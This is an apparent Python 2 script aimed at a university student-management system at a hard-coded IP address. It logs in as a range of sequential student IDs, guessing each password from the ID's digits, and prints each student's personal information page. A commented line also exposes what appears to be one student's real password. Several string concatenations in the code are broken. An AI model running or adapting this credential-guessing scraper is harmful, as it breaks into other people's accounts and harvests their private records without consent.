#encoding:utf-8
import requests
import urllib
import datetime
import time
ctguRequest = requests.session()

def getCookie():
    loginUrl = "http://210.42.35.33/xg/home/login.do"
    result =  ctguRequest.get(loginUrl)
    return result.cookies['JSESSIONID']

def createHeaders(cookie):
    headers = {
        'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Cookie':'JSESSIONID='+cookie,
        'Accept-Encoding':'gzip, deflate, sdch',
        'Origin':'http://210.42.38.26:84',
        'Accept-Language':'zh-CN,zh;q=0.8,en;q=0.6,zh-TW;q=0.4',
        'Connection':'keep-alive',
        'Host':'210.42.35.33',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Upgrade-Insecure-Requests':1,
        'User-Agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.101 Safari/537.36',
        'Referer': 'http://210.42.35.33/xg/home/login.do'
    }
    return headers

def login(username,password,headers):
    form = {
        'user_name':username,
        'pass_word':password
    }
    data = urllib.urlencode(form)
    thistime = time.mktime(datetime.datetime.now().timetuple())

    try:
        loginUrl = "http://210.42.35.33/xg/home/login.do"
        result = ctguRequest.post(loginUrl,headers=headers,data=data)
        # infoUrl = 'http://210.42.35.33/xg/student/toTableInfo.do?_tsp_=1445415129990&typeid=info&studentId=2012136121&method=edit'
        infoUrl = 'http://210.42.35.33/xg/student/toTableInfo.do?_tsp_='+thistime+'&typeid=info&studentId='+username+'&method=edit'
        print infoUrl
        page = ctguRequest.get(infoUrl,headers=headers).text
        print page
        logOutUrl = 'http://210.42.35.33/xg/home/logout.do'
        ctguRequest.get(logOutUrl,headers=headers)
    except:
        pass


if __name__ =='__main__':
    cookie = getCookie()
    headers = createHeaders(cookie)
    for i in range(2012136101,2012136136):
        j = i - 2012000000
        login(i,j,headers)
    # login(2012136121,'f7t9Cy2eiR9r',headers)
    # login(2012136120,136120,headers)



